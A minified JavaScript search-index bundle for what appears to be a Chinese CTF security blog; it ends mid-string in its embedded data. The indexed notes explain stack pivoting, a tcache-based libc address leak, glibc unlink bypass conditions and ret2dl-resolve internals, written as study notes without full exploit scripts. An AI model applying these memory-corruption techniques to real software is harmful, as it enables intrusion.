const nt="ENTRIES",V="KEYS",T="VALUES",F="";class D{set;_type;_path;constructor(t,s){const n=t._tree,u=Array.from(n.keys());this.set=t,this._type=s,this._path=u.length>0?[{node:n,keys:u}]:[]}next(){const t=this.dive();return this.backtrack(),t}dive(){if(this._path.length===0)return{done:!0,value:void 0};const{node:t,keys:s}=E(this._path);if(E(s)===F)return{done:!1,value:this.result()};const n=t.get(E(s));return this._path.push({node:n,keys:Array.from(n.keys())}),this.dive()}backtrack(){if(this._path.length===0)return;const t=E(this._path).keys;t.pop(),!(t.length>0)&&(this._path.pop(),this.backtrack())}key(){return this.set._prefix+this._path.map(({keys:t})=>E(t)).filter(t=>t!==F).join("")}value(){return E(this._path).node.get(F)}result(){switch(this._type){case T:return this.value();case V:return this.key();default:return[this.key(),this.value()]}}[Symbol.iterator](){return this}}const E=e=>e[e.length-1],ut=(e,t,s)=>{const n=new Map;if(t===void 0)return n;const u=t.length+1,o=u+s,i=new Uint8Array(o*u).fill(s+1);for(let r=0;r<u;++r)i[r]=r;for(let r=1;r<o;++r)i[r*u]=r;return R(e,t,s,n,i,1,u,""),n},R=(e,t,s,n,u,o,i,r)=>{const d=o*i;t:for(const l of e.keys())if(l===F){const a=u[d-1];a<=s&&n.set(r,[e.get(l),a])}else{let a=o;for(let h=0;h<l.length;++h,++a){const m=l[h],p=i*a,f=p-i;let c=u[p];const g=Math.max(0,a-s-1),_=Math.min(i-1,a+s);for(let y=g;y<_;++y){const b=m!==t[y],z=u[f+y]+ +b,A=u[f+y+1]+1,w=u[p+y]+1,L=u[p+y+1]=Math.min(z,A,w);L<c&&(c=L)}if(c>s)continue t}R(e.get(l),t,s,n,u,a,i,r+l)}};class C{_tree;_prefix;_size=void 0;constructor(t=new Map,s=""){this._tree=t,this._prefix=s}atPrefix(t){if(!t.startsWith(this._prefix))throw new Error("Mismatched prefix");const[s,n]=x(this._tree,t.slice(this._prefix.length));if(s===void 0){const[u,o]=M(n);for(const i of u.keys())if(i!==F&&i.startsWith(o)){const r=new Map;return r.set(i.slice(o.length),u.get(i)),new C(r,t)}}return new C(s,t)}clear(){this._size=void 0,this._tree.clear()}delete(t){return this._size=void 0,ot(this._tree,t)}entries(){return new D(this,nt)}forEach(t){for(const[s,n]of this)t(s,n,this)}fuzzyGet(t,s){return ut(this._tree,t,s)}get(t){const s=I(this._tree,t);return s!==void 0?s.get(F):void 0}has(t){const s=I(this._tree,t);return s!==void 0&&s.has(F)}keys(){return new D(this,V)}set(t,s){if(typeof t!="string")throw new Error("key must be a string");return this._size=void 0,O(this._tree,t).set(F,s),this}get size(){if(this._size)return this._size;this._size=0;const t=this.entries();for(;!t.next().done;)this._size+=1;return this._size}update(t,s){if(typeof t!="string")throw new Error("key must be a string");this._size=void 0;const n=O(this._tree,t);return n.set(F,s(n.get(F))),this}fetch(t,s){if(typeof t!="string")throw new Error("key must be a string");this._size=void 0;const n=O(this._tree,t);let u=n.get(F);return u===void 0&&n.set(F,u=s()),u}values(){return new D(this,T)}[Symbol.iterator](){return this.entries()}static from(t){const s=new C;for(const[n,u]of t)s.set(n,u);return s}static fromObject(t){return C.from(Object.entries(t))}}const x=(e,t,s=[])=>{if(t.length===0||e==null)return[e,s];for(const n of e.keys())if(n!==F&&t.startsWith(n))return s.push([e,n]),x(e.get(n),t.slice(n.length),s);return s.push([e,t]),x(void 0,"",s)},I=(e,t)=>{if(t.length===0||e==null)return e;for(const s of e.keys())if(s!==F&&t.startsWith(s))return I(e.get(s),t.slice(s.length))},O=(e,t)=>{const s=t.length;t:for(let n=0;e&&n<s;){for(const o of e.keys())if(o!==F&&t[n]===o[0]){const i=Math.min(s-n,o.length);let r=1;for(;r<i&&t[n+r]===o[r];)++r;const d=e.get(o);if(r===o.length)e=d;else{const l=new Map;l.set(o.slice(r),d),e.set(t.slice(n,n+r),l),e.delete(o),e=l}n+=r;continue t}const u=new Map;return e.set(t.slice(n),u),u}return e},ot=(e,t)=>{const[s,n]=x(e,t);if(s!==void 0){if(s.delete(F),s.size===0)W(n);else if(s.size===1){const[u,o]=s.entries().next().value;q(n,u,o)}}},W=e=>{if(e.length===0)return;const[t,s]=M(e);if(t.delete(s),t.size===0)W(e.slice(0,-1));else if(t.size===1){const[n,u]=t.entries().next().value;n!==F&&q(e.slice(0,-1),n,u)}},q=(e,t,s)=>{if(e.length===0)return;const[n,u]=M(e);n.set(u+t,s),n.delete(u)},M=e=>e[e.length-1],it=(e,t)=>{const s=e._idToShortId.get(t);if(s!=null)return e._storedFields.get(s)},rt=/[\n\r -#%-*,-/:;?@[-\]_{}\u00A0\u00A1\u00A7\u00AB\u00B6\u00B7\u00BB\u00BF\u037E\u0387\u055A-\u055F\u0589\u058A\u05BE\u05C0\u05C3\u05C6\u05F3\u05F4\u0609\u060A\u060C\u060D\u061B\u061E\u061F\u066A-\u066D\u06D4\u0700-\u070D\u07F7-\u07F9\u0830-\u083E\u085E\u0964\u0965\u0970\u09FD\u0A76\u0AF0\u0C77\u0C84\u0DF4\u0E4F\u0E5A\u0E5B\u0F04-\u0F12\u0F14\u0F3A-\u0F3D\u0F85\u0FD0-\u0FD4\u0FD9\u0FDA\u104A-\u104F\u10FB\u1360-\u1368\u1400\u166E\u1680\u169B\u169C\u16EB-\u16ED\u1735\u1736\u17D4-\u17D6\u17D8-\u17DA\u1800-\u180A\u1944\u1945\u1A1E\u1A1F\u1AA0-\u1AA6\u1AA8-\u1AAD\u1B5A-\u1B60\u1BFC-\u1BFF\u1C3B-\u1C3F\u1C7E\u1C7F\u1CC0-\u1CC7\u1CD3\u2000-\u200A\u2010-\u2029\u202F-\u2043\u2045-\u2051\u2053-\u205F\u207D\u207E\u208D\u208E\u2308-\u230B\u2329\u232A\u2768-\u2775\u27C5\u27C6\u27E6-\u27EF\u2983-\u2998\u29D8-\u29DB\u29FC\u29FD\u2CF9-\u2CFC\u2CFE\u2CFF\u2D70\u2E00-\u2E2E\u2E30-\u2E4F\u3000-\u3003\u3008-\u3011\u3014-\u301F\u3030\u303D\u30A0\u30FB\uA4FE\uA4FF\uA60D-\uA60F\uA673\uA67E\uA6F2-\uA6F7\uA874-\uA877\uA8CE\uA8CF\uA8F8-\uA8FA\uA8FC\uA92E\uA92F\uA95F\uA9C1-\uA9CD\uA9DE\uA9DF\uAA5C-\uAA5F\uAADE\uAADF\uAAF0\uAAF1\uABEB\uFD3E\uFD3F\uFE10-\uFE19\uFE30-\uFE52\uFE54-\uFE61\uFE63\uFE68\uFE6A\uFE6B\uFF01-\uFF03\uFF05-\uFF0A\uFF0C-\uFF0F\uFF1A\uFF1B\uFF1F\uFF20\uFF3B-\uFF3D\uFF3F\uFF5B\uFF5D\uFF5F-\uFF65]+/u,S="or",$="and",ct="and_not",lt=(e,t)=>{e.includes(t)||e.push(t)},P=(e,t)=>{for(const s of t)e.includes(s)||e.push(s)},N=({score:e},{score:t})=>t-e,ht=()=>new Map,k=e=>{const t=new Map;for(const s of Object.keys(e))t.set(parseInt(s,10),e[s]);return t},G=(e,t)=>Object.prototype.hasOwnProperty.call(e,t)?e[t]:void 0,dt={[S]:(e,t)=>{for(const s of t.keys()){const n=e.get(s);if(n==null)e.set(s,t.get(s));else{const{score:u,terms:o,match:i}=t.get(s);n.score=n.score+u,n.match=Object.assign(n.match,i),P(n.terms,o)}}return e},[$]:(e,t)=>{const s=new Map;for(const n of t.keys()){const u=e.get(n);if(u==null)continue;const{score:o,terms:i,match:r}=t.get(n);P(u.terms,i),s.set(n,{score:u.score+o,terms:u.terms,match:Object.assign(u.match,r)})}return s},[ct]:(e,t)=>{for(const s of t.keys())e.delete(s);return e}},at=(e,t,s,n,u,o)=>{const{k:i,b:r,d}=o;return Math.log(1+(s-t+.5)/(t+.5))*(d+e*(i+1)/(e+i*(1-r+r*n/u)))},ft=e=>(t,s,n)=>{const u=typeof e.fuzzy=="function"?e.fuzzy(t,s,n):e.fuzzy||!1,o=typeof e.prefix=="function"?e.prefix(t,s,n):e.prefix===!0;return{term:t,fuzzy:u,prefix:o}},H=(e,t,s,n)=>{for(const u of Object.keys(e._fieldIds))if(e._fieldIds[u]===s){e._options.logger("warn",`SlimSearch: document with ID ${e._documentIds.get(t)} has changed before removal: term "${n}" was not present in field "${u}". Removing a document after it has changed can corrupt the index!`,"version_conflict");return}},gt=(e,t,s,n)=>{if(!e._index.has(n)){H(e,s,t,n);return}const u=e._index.fetch(n,ht),o=u.get(t);o==null||o.get(s)==null?H(e,s,t,n):o.get(s)<=1?o.size<=1?u.delete(t):o.delete(s):o.set(s,o.get(s)-1),e._index.get(n).size===0&&e._index.delete(n)},mt={k:1.2,b:.7,d:.5},pt={idField:"id",extractField:(e,t)=>e[t],tokenize:e=>e.split(rt),processTerm:e=>e.toLowerCase(),fields:void 0,searchOptions:void 0,storeFields:[],logger:(e,t)=>{typeof console?.[e]=="function"&&console[e](t)},autoVacuum:!0},J={combineWith:S,prefix:!1,fuzzy:!1,maxFuzzy:6,boost:{},weights:{fuzzy:.45,prefix:.375},bm25:mt},Ft={combineWith:$,prefix:(e,t,s)=>t===s.length-1},_t={batchSize:1e3,batchWait:10},U={minDirtFactor:.1,minDirtCount:20},yt={..._t,...U},Y=(e,t=S)=>{if(e.length===0)return new Map;const s=t.toLowerCase();return e.reduce(dt[s])||new Map},B=(e,t,s,n,u,o,i,r,d=new Map)=>{if(u==null)return d;for(const l of Object.keys(o)){const a=o[l],h=e._fieldIds[l],m=u.get(h);if(m==null)continue;let p=m.size;const f=e._avgFieldLength[h];for(const c of m.keys()){if(!e._documentIds.has(c)){gt(e,h,c,s),p-=1;continue}const g=i?i(e._documentIds.get(c),s,e._storedFields.get(c)):1;if(!g)continue;const _=m.get(c),y=e._fieldLength.get(c)[h],b=at(_,p,e._documentCount,y,f,r),z=n*a*g*b,A=d.get(c);if(A){A.score+=z,lt(A.terms,t);const w=G(A.match,s);w?w.push(l):A.match[s]=[l]}else d.set(c,{score:z,terms:[t],match:{[s]:[l]}})}}return d},At=(e,t,s)=>{const n={...e._options.searchOptions,...s},u=(n.fields||e._options.fields).reduce((c,g)=>({...c,[g]:G(n.boost,g)||1}),{}),{boostDocument:o,weights:i,maxFuzzy:r,bm25:d}=n,{fuzzy:l,prefix:a}={...J.weights,...i},h=e._index.get(t.term),m=B(e,t.term,t.term,1,h,u,o,d);let p,f;if(t.prefix&&(p=e._index.atPrefix(t.term)),t.fuzzy){const c=t.fuzzy===!0?.2:t.fuzzy,g=c<1?Math.min(r,Math.round(t.term.length*c)):c;g&&(f=e._index.fuzzyGet(t.term,g))}if(p)for(const[c,g]of p){const _=c.length-t.term.length;if(!_)continue;f?.delete(c);const y=a*c.length/(c.length+.3*_);B(e,t.term,c,y,g,u,o,d,m)}if(f)for(const c of f.keys()){const[g,_]=f.get(c);if(!_)continue;const y=l*c.length/(c.length+_);B(e,t.term,c,y,g,u,o,d,m)}return m},X=(e,t,s={})=>{if(typeof t!="string"){const a={...s,...t,queries:void 0},h=t.queries.map(m=>X(e,m,a));return Y(h,a.combineWith)}const{tokenize:n,processTerm:u,searchOptions:o}=e._options,i={tokenize:n,processTerm:u,...o,...s},{tokenize:r,processTerm:d}=i,l=r(t).flatMap(a=>d(a)).filter(a=>!!a).map(ft(i)).map(a=>At(e,a,i));return Y(l,i.combineWith)},K=(e,t,s={})=>{const n=X(e,t,s),u=[];for(const[o,{score:i,terms:r,match:d}]of n){const l=r.length,a={id:e._documentIds.get(o),score:i*l,terms:Object.keys(d),match:d};Object.assign(a,e._storedFields.get(o)),(s.filter==null||s.filter(a))&&u.push(a)}return u.sort(N),u},Ct=(e,t,s={})=>{s={...e._options.autoSuggestOptions,...s};const n=new Map;for(const{score:o,terms:i}of K(e,t,s)){const r=i.join(" "),d=n.get(r);d!=null?(d.score+=o,d.count+=1):n.set(r,{score:o,terms:i,count:1})}const u=[];for(const[o,{score:i,terms:r,count:d}]of n)u.push({suggestion:o,terms:r,score:i/d});return u.sort(N),u};class Et{_options;_index;_documentCount;_documentIds;_idToShortId;_fieldIds;_fieldLength;_avgFieldLength;_nextId;_storedFields;_dirtCount;_currentVacuum;_enqueuedVacuum;_enqueuedVacuumConditions;constructor(t){if(t?.fields==null)throw new Error('SlimSearch: option "fields" must be provided');const s=t.autoVacuum==null||t.autoVacuum===!0?yt:t.autoVacuum;this._options={...pt,...t,autoVacuum:s,searchOptions:{...J,...t.searchOptions||{}},autoSuggestOptions:{...Ft,...t.autoSuggestOptions||{}}},this._index=new C,this._documentCount=0,this._documentIds=new Map,this._idToShortId=new Map,this._fieldIds={},this._fieldLength=new Map,this._avgFieldLength=[],this._nextId=0,this._storedFields=new Map,this._dirtCount=0,this._currentVacuum=null,this._enqueuedVacuum=null,this._enqueuedVacuumConditions=U,this.addFields(this._options.fields)}get isVacuuming(){return this._currentVacuum!=null}get dirtCount(){return this._dirtCount}get dirtFactor(){return this._dirtCount/(1+this._documentCount+this._dirtCount)}get documentCount(){return this._documentCount}get termCount(){return this._index.size}toJSON(){const t=[];for(const[s,n]of this._index){const u={};for(const[o,i]of n)u[o]=Object.fromEntries(i);t.push([s,u])}return{documentCount:this._documentCount,nextId:this._nextId,documentIds:Object.fromEntries(this._documentIds),fieldIds:this._fieldIds,fieldLength:Object.fromEntries(this._fieldLength),averageFieldLength:this._avgFieldLength,storedFields:Object.fromEntries(this._storedFields),dirtCount:this._dirtCount,index:t,serializationVersion:2}}addFields(t){for(let s=0;s<t.length;s++)this._fieldIds[t[s]]=s}}const zt=({index:e,documentCount:t,nextId:s,documentIds:n,fieldIds:u,fieldLength:o,averageFieldLength:i,storedFields:r,dirtCount:d,serializationVersion:l},a)=>{if(l!==1&&l!==2)throw new Error("SlimSearch: cannot deserialize an index created with an incompatible version");const h=new Et(a);h._documentCount=t,h._nextId=s,h._documentIds=k(n),h._idToShortId=new Map,h._fieldIds=u,h._fieldLength=k(o),h._avgFieldLength=i,h._storedFields=k(r),h._dirtCount=d||0,h._index=new C;for(const[m,p]of h._documentIds)h._idToShortId.set(p,m);for(const[m,p]of e){const f=new Map;for(const c of Object.keys(p)){let g=p[c];l===1&&(g=g.ds),f.set(parseInt(c,10),k(g))}h._index.set(m,f)}return h},Q=Object.entries,wt=Object.fromEntries,j=(e,t)=>{const s=e.toLowerCase(),n=t.toLowerCase(),u=[];let o=0,i=0;const r=(l,a=!1)=>{let h="";i===0?h=l.length>20?`… ${l.slice(-20)}`:l:a?h=l.length+i>100?`${l.slice(0,100-i)}… `:l:h=l.length>20?`${l.slice(0,20)} … ${l.slice(-20)}`:l,h&&u.push(h),i+=h.length,a||(u.push(["mark",t]),i+=t.length,i>=100&&u.push(" …"))};let d=s.indexOf(n,o);if(d===-1)return null;for(;d>=0;){const l=d+n.length;if(r(e.slice(o,d)),o=l,i>100)break;d=s.indexOf(n,o)}return i<100&&r(e.slice(o),!0),u},Z=/[\u4e00-\u9fa5]/g,tt=(e={})=>({fuzzy:.2,prefix:!0,processTerm:t=>{const s=t.match(Z)||[],n=t.replace(Z,"").toLowerCase();return n?[n,...s]:[...s]},...e}),xt=(e,t)=>t.contents.reduce((s,[,n])=>s+n,0)-e.contents.reduce((s,[,n])=>s+n,0),kt=(e,t)=>Math.max(...t.contents.map(([,s])=>s))-Math.max(...e.contents.map(([,s])=>s)),et=(e,t,s={})=>{const n={};return K(t,e,tt({boost:{h:2,t:1,c:4},...s})).forEach(u=>{const{id:o,terms:i,score:r}=u,d=o.includes("@"),l=o.includes("#"),[a,h]=o.split(/[#@]/),m=i.sort((f,c)=>f.length-c.length).filter((f,c)=>i.slice(c+1).every(g=>!g.includes(f))),{contents:p}=n[a]??={title:"",contents:[]};if(d)p.push([{type:"customField",key:a,index:h,display:m.map(f=>u.c.map(c=>j(c,f))).flat().filter(f=>f!==null)},r]);else{const f=m.map(c=>j(u.h,c)).filter(c=>c!==null);if(f.length&&p.push([{type:l?"heading":"title",key:a,...l&&{anchor:h},display:f},r]),"t"in u)for(const c of u.t){const g=m.map(_=>j(c,_)).filter(_=>_!==null);g.length&&p.push([{type:"text",key:a,...l&&{anchor:h},display:g},r])}}}),Q(n).sort(([,u],[,o])=>"max"==="total"?xt(u,o):kt(u,o)).map(([u,{title:o,contents:i}])=>{if(!o){const r=it(t,u);r&&(o=r.h)}return{title:o,contents:i.map(([r])=>r)}})},st=(e,t,s={})=>Ct(t,e,tt(s)).map(({suggestion:n})=>n),v=wt(Q(JSON.parse("{\"/\":{\"documentCount\":56,\"nextId\":56,\"documentIds\":{\"0\":\"v-8daa1a0e\",\"1\":\"v-a39c5664\",\"2\":\"v-a39c5664#栈迁移\",\"3\":\"v-a39c5664#栈迁移的大致操作\",\"4\":\"v-a39c5664#栈迁移核心\",\"5\":\"v-4b77e47b\",\"6\":\"v-4b77e47b#重要知识点\",\"7\":\"v-4b77e47b#tcahe机制\",\"8\":\"v-4b77e47b#机制\",\"9\":\"v-4b77e47b#利用tcache泄露地址\",\"10\":\"v-40b47381\",\"11\":\"v-40b47381#分析一下题\",\"12\":\"v-40b47381#chunk分析\",\"13\":\"v-40b47381#漏洞学习\",\"14\":\"v-40b47381#先学习unlink漏洞\",\"15\":\"v-40b47381#流程\",\"16\":\"v-40b47381#调试技巧\",\"17\":\"v-40b47381#学习路线\",\"18\":\"v-f8cff32a\",\"19\":\"v-f8cff32a#部分前置知识讲解\",\"20\":\"v-f8cff32a#got表和plt表详细解说\",\"21\":\"v-f8cff32a#dl-runtime-resolve部分详细解说\",\"22\":\"v-f8cff32a#reloc-index\",\"23\":\"v-623b66b3\",\"24\":\"v-623b66b3#映射端口\",\"25\":\"v-623b66b3#pc查询手机的进程\",\"26\":\"v-623b66b3#hook相关\",\"27\":\"v-623b66b3#hook-js脚本\",\"28\":\"v-623b66b3#附着脚本\",\"29\":\"v-623b66b3#js代码的书写\",\"30\":\"v-623b66b3#使用java的平台\",\"31\":\"v-623b66b3#获取指定的java类\",\"32\":\"v-623b66b3#调用原本的函数\",\"33\":\"v-623b66b3#hook重载函数\",\"34\":\"v-623b66b3#hook构造方法\",\"35\":\"v-623b66b3#修改类的字段\",\"36\":\"v-623b66b3#枚举所有的类和方法\",\"37\":\"v-623b66b3#hook-so中的函数\",\"38\":\"v-4e13633e\",\"39\":\"v-4e13633e#实战\",\"40\":\"v-4e13633e#获取包名\",\"41\":\"v-4e13633e#hook-一个测试脚本\",\"42\":\"v-a8c94236\",\"43\":\"v-a8c94236#连接\",\"44\":\"v-0ad2e68c\",\"45\":\"v-0ad2e68c#linux中常用的指令\",\"46\":\"v-0ad2e68c#ifs变量\",\"47\":\"v-0ad2e68c#ifs-的工作原理\",\"48\":\"v-0ad2e68c#这里举列子\",\"49\":\"v-0ad2e68c#payload\",\"50\":\"v-fdb1bb18\",\"51\":\"v-fdb1bb18#实验float的存储数据\",\"52\":\"v-fdb1bb18#尝试覆盖\",\"53\":\"v-e1e3da16\",\"54\":\"v-1eb8e595\",\"55\":\"v-6af0971a\"},\"fieldIds\":{\"h\":0,\"t\":1,\"c\":2},\"fieldLength\":{\"0\":[2,30],\"1\":[3],\"2\":[1,3],\"3\":[1,15],\"4\":[1,78],\"5\":[5],\"6\":[1,29],\"7\":[1,16],\"8\":[1,62],\"9\":[1,39],\"10\":[3],\"11\":[1,53],\"12\":[1,20],\"13\":[1,6],\"14\":[1,20],\"15\":[1,52],\"16\":[1,1],\"17\":[2,2],\"18\":[1],\"19\":[1],\"20\":[1,106],\"21\":[4,15],\"22\":[2,57],\"23\":[1,10],\"24\":[2,5],\"25\":[1,4],\"26\":[1],\"27\":[2],\"28\":[1,19],\"29\":[1],\"30\":[1,6],\"31\":[1,45],\"32\":[1,11],\"33\":[1,69],\"34\":[1,54],\"35\":[1,75],\"36\":[1,46],\"37\":[2,49],\"38\":[1,6],\"39\":[1],\"40\":[1,8],\"41\":[2,127],\"42\":[2],\"43\":[1,29],\"44\":[3,42],\"45\":[1,140],\"46\":[1,2],\"47\":[2,19],\"48\":[2,15],\"49\":[1,1],\"50\":[4,62],\"51\":[1,76],\"52\":[1,33],\"53\":[1],\"54\":[1],\"55\":[1]},\"averageFieldLength\":[1.4642857142857142,35.16903947435452],\"storedFields\":{\"0\":{\"h\":\"Blog Home\",\"t\":[\"This is a blog home page demo.\",\"To use this layout, you should set both layout: BlogHome and home: true in the page front matter.\",\"For related configuration docs, please see blog homepage.\"]},\"1\":{\"h\":\"8byte（简单栈迁移）\"},\"2\":{\"h\":\"栈迁移\",\"t\":[\"这里好好学一下栈迁移这个知识点 确实重要 因为已经遇到了很多次了\"]},\"3\":{\"h\":\"栈迁移的大致操作\",\"t\":[\"通过将ebp覆盖成构造的fake_ebp ，再利用leave_ret这个gadget将esp劫持到fake_ebp的地址上。\",\"这里写个小插曲 因为大多数时候我都是去ida直接找的这个gadget 但是好像可以用命令行来解决这个问题比如我们这里用指令\",\"$ ROPgadget --binary pwn --only \\\"leave|ret\\\" \"]},\"4\":{\"h\":\"栈迁移核心\",\"t\":[\"因为我们常使用leave_ret gadget链来实现\",\" leave指令\",\"首先是依靠这个指令来实现把rbp寄存器值变为我们希望的一个地址 这样就可以实现栈的移动\",\"这里说一下我自己的浅薄理解 因为我们使用的栈其实本质就是基于rbp/rsp定位的 所以我们只需要把寄存器的值改变就实现了栈迁移 新的fake 地址后面的内容会被当成栈\",\"那么这个指令的本质:\",\"mov esp,ebp; pop ebp; \",\"ret 指令\",\"pop eip \",\"那么下面是实现原理图\",\"原理\",\"这里是执行mov esp ,ebp;这个操作之前的栈结构 我们在ebp这个位置放入我们我们希望这个栈最终落脚点 然后就会执行\",\"​ \",\"这里就是pop ebp;这个操作 因为 pop操作我们的rsp向下移动一格 ebp寄存器 存入fake_ebp1_addr\",\"然后执行指令ret--> pop eip; 这个指令 那么同理 rsp向下移动一格 eip存入我们的read_plt\",\"这里需要注意eip这个寄存器很特殊 这个寄存器是存入的我们下一条执行的指令地址 所以当执行完ret后整个程序流程就跑到了read_plt这里\",\"那么 到现在我们就可以理清楚了核心需要实现的部分:\",\"将rbp寄存器改值 ---- >栈迁移\",\"将rip寄存器改值 ------ >劫持程序流程\",\"换句话说 我们只要能够实现这两个部分就可以了\",\"接下来我们需要理解 栈的指针寄存器:rsp 还任然留在了原地 以及最容易理解错的是 当我们执行read函数的时候 程序会自动保存下一个指令的地址 这是函数的调用约定所以当我们执行完后read函数后 我们来到了leave_ret指令的地方\",\"此时我们rsp = rbp 那么我们的rsp也成功完成了迁移工作 来到了 fake_ebp的地方\",\"然后 把fake_ebp2的地址给了rbp rsp向下跑一下\",\"原理3\",\"所以这里我们是需要构造第二个fake_ebp的\",\"然后我们就成功完成了一次栈迁移\"]},\"5\":{\"h\":\"c2018-HitCon-gundam(tcahe机制+泄露libc地址)\"},\"6\":{\"h\":\"重要知识点\",\"t\":[\"由于linux中使用free()进行内存释放时，不大于 max_fast （默认值为 64B）的 chunk 被释放后，首先会被放到 fast bins中，大于max_fast的chunk或者fast bins 中的空闲 chunk 合并后会被放入unsorted bin中。而在fastbin为空时，unsortbin的fd和bk指向自身main_arena中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出main_arena的实际地址，结合偏移值从而得到libc的加载地址。\"]},\"7\":{\"h\":\"tcahe机制\",\"t\":[\"学习文章:glibc Tcache机制-CSDN博客\",\"一共有64个bins\",\"Tcache缓存的是非Large Chunk的chunk。\",\"首先是tcahe是单链表结构,每条链上最多可以有7个chunk\",\"free后 当对应的tcahe bin放满了 才会放入fastbin,unsorted bin\",\"malloc的时候优先去tcahe中找\"]},\"8\":{\"h\":\"机制\",\"t\":[\"代码:\",\"这里tcache_perthread_struct 首先\",\"counts代表着每个bin当前所有的chunk数量\",\"tcache_entry代表着当前bin的首个chunk\",\"由于是单链形式 所以结构体属性就是下一个chunk的指针\",\"typedef struct tcache_entry { struct tcache_entry *next; } tcache_entry; /* There is one of these for each thread, which contains the per-thread cache (hence \\\"tcache_perthread_struct\\\"). Keeping overall size low is mildly important. Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons. */ typedef struct tcache_perthread_struct { char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct; static __thread tcache_perthread_struct *tcache = NULL; \",\"结构图\",\"机制\"]},\"9\":{\"h\":\"利用tcache泄露地址\",\"t\":[\"tcache位于heap最前端 也属于一个堆块\",\"用vmmap指令查找heap最开始的位置\",\"用x/26gx 指令来查看对应地址 堆结构 （x/26gx 0x55e22cd98000+0x10）\",\"heap\",\"也就是最后一个加入tcache的chunk\",\"我们通过连续申请8个gundam,让第八个gundam出现在unsorted bin里面 那么我们如何找到它呢?\",\"我们这里知道了第七个地址 那么第八个的地址:x/26gx 0x000055e22cd98a10+0x30+0x110-0x10\",\"一个gundam包含两个chunk,大小为0x30,另一个为0x110\",\"那么输入指令后我们找到了这个chunk\",\"unsorted_bins\",\"我们可以发现这个地方fd和bk都指向了 同一个地址 也就是main_arena+88(unsortedbin头结点)\",\"然后我们就得到了main_arena的地址\",\"再去查找libc的基地址 vmmap得到的:\",\"计算:\",\"0x7f566befac78-libc基地址0x7f566bb4f000=偏移0x3ac78\",\"这里我们就得到了偏移 这样在远程服务器的时候就可以利用这个偏移获取libc基地址\"]},\"10\":{\"h\":\"ezChunk(unlink+offbynull)\"},\"11\":{\"h\":\"分析一下题\",\"t\":[\"进入 addemo函数内部 查找关键结构体\",\"st数据看起来是关键\",\"(_DWORD *)&st_next12 + 10 * i 这个是存size的\",\"(_QWORD *)&st + 5 * i这个是emo content的内容\",\"(char *)&st + 40 * i + 20是存name的\",\"*((_DWORD *)&st_next8 + 10 * i)存使用情况\",\"我们这里开始简单运算一下 这个数组到底是怎么存放数据的 指针为char类型\",\"存size: point + 40 *i +12 存 int类型\",\"存content :point + 40 *i 存一个结构体指针\",\"存name: point + 40*i +20\",\"存使用情况:point +40*i +8 存一个int\",\"所以每个元素:\",\"type emo struct { Content *string // 0-8 IsUsed int // 8-12 Size int // 12-16 index int // 16-20 Name string[16] //20-36 } \"]},\"12\":{\"h\":\"chunk分析\",\"t\":[\"在addemo的时候name malloc(0x10) 马上free了 但是没有清空\",\"emo content的时候malloc(size)\",\"在delemo的时候是根据emo.isused来判断是否存在的\",\"emo.content被清空 并且被清空\",\"emo.isused被设置为0\",\"editemo的时候是根据判断emo.content是否为空去编辑的\",\"直接向emo.content中写入内容\",\"printemo是根据emo.content是否为空去判断的\",\"然后直接打印出来\"]},\"13\":{\"h\":\"漏洞学习\",\"t\":[\"这题存在off_by_null漏洞\",\"构造heap overlap 触发unlink漏洞\"]},\"14\":{\"h\":\"先学习unlink漏洞\",\"t\":[\"学习文章:一道题彻底理解 Pwn Heap Unlink-腾讯云开发者社区-腾讯云 (tencent.com)\",\"明确一下对象双向链表\",\"宏定义\",\"#define unlink(AV, P, BK, FD) \",\"P： 待脱链的空闲chunk的指针\",\"BK：后一个chunk的指针\",\"FD：前一个chunk的指针\"]},\"15\":{\"h\":\"流程\",\"t\":[\"大小检查\",\"if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) malloc_printerr (\\\"corrupted size vs. prev_size\\\"); \",\"检查下一个chunk的prev_size是否与p的大小相同\",\"获取fd与bk\",\"通过p的fd/bk去获取前面一个chunk的fd和后面一个chunk的bk\",\"检查\",\"if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) malloc_printerr (\\\"corrupted double-linked list\\\"); \",\"这里很关键因为会检查前后chunk中 fd或者bk 指向的是否是p chunk\",\"这里等效为:\",\"P->fd->bk == P <=> *(P->fd + 0x18) == P p->bk->fd == P <=> *(p->bk + 0x10) == P \",\"那么就很明确了\",\"将p->fd置为 (&p-0x18)\",\"将p->bk设置为 (&p-0x10)\",\"脱链\",\"FD->bk = BK 与BK->fd = FD\",\"FD->bk = BK <=> P->fd->bk = p->bk <=> *(P->fd + 0x18) = P->bk //Ⅰ BK->fd = FD <=> P->bk->fd = p->fd <=> *(P->bk + 0x10) = P->fd //Ⅱ \",\"等效为: P->fd->bk = p->bk与 P->bk->fd = p->fd\",\"这里相当于让前后的chunk连接起来了 把中间的chunk忽略掉\"]},\"16\":{\"h\":\"调试技巧\",\"t\":[\"heap可以查看当前的chunk\"]},\"17\":{\"h\":\"学习路线:\",\"t\":[\"学习路线\",\"​\"]},\"18\":{\"h\":\"ret2dl\"},\"19\":{\"h\":\"部分前置知识讲解\"},\"20\":{\"h\":\"got表和plt表详细解说\",\"t\":[\"这里我们不对plt和got表内详细内容进行介绍了 需要了解的参考这个文章:深入窥探动态链接 - 知乎 (zhihu.com)我们主要探讨在第一次数据绑定的时候 我们程序究竟是怎么运行的 我们假设我们的函数在plt[1]的地方\",\"运行PLT[1]\",\"由于我是是第一次的调用 所以GOT[3]的内容为:PLT[1]中push reloc_arg;指令的地址 也就是会自动跳转PLT[0]去完成绑定 并且 将reloc_arg参数作为参数这里PLT[N]与GOT[2+N]一 一对应\",\"jmp [GOT[3]]; push reloc_arg; jmp PLT[0]; \",\"运行PLT[0]\",\"这里相当于_dl_runtime_resolve(link_map,reloc_arg)\",\"push [GOT[1]]; // 1存的就是link_map jmp [GOT[2]]; // 2存的是_dl_runtime_resolve函数 \",\"_dl_runtime_resolve函数\",\"这里写了一个大概的源码 方便我们了解 大概就是调用_dl_fixup然后这个函数将真实的地址返回给rax寄存器 最后我们jmp过去 实现函数调用\",\"# _dl_runtime_resolve 示例 - x86_64 汇编 # # 注意：这是一个简化的示例，用于说明目的。 # 实际实现会根据系统的动态链接器的具体需求和优化而有所不同。 .global _dl_runtime_resolve .type _dl_runtime_resolve, @function _dl_runtime_resolve: # 保存寄存器，因为这些寄存器会在 _dl_fixup 中被使用 pushq %rax # 